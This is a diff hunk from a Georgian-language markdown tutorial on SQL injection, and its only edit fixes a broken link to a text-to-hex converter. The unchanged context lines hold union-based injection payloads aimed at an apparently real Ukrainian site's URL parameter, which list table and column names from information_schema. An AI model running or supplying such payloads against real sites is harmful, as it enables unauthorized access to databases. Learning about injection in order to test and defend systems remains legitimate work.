@@ -126,7 +126,7 @@ http://www.kiis.com.ua/?id=2&sp=-1+union+select+1,2,3,4,concat(table_name),6,7,8
 group_concat(column_name)  +from+information_schema.columns+where+table_name=0xTable
 ```
 
-სადაც Table ჩვენი არჩეული ცხრილის ჰექსია. ტექსტის ჰექსებში გადაყვანა შეგიძლიათ  [ამ ბმულზე]](http://www.swingnote.com/tools/texttohex.php).
+სადაც Table ჩვენი არჩეული ცხრილის ჰექსია. ტექსტის ჰექსებში გადაყვანა შეგიძლიათ  [ამ ბმულზე](http://www.swingnote.com/tools/texttohex.php).
 
 ჩვენს შემთხვევაში **group_concat** ბრძანება არ მუშაობს გამართულად, ამიტომ აქაც ვიყენებთ მას სახეცვლილი ფორმით:  **concat(column_name)**  
 
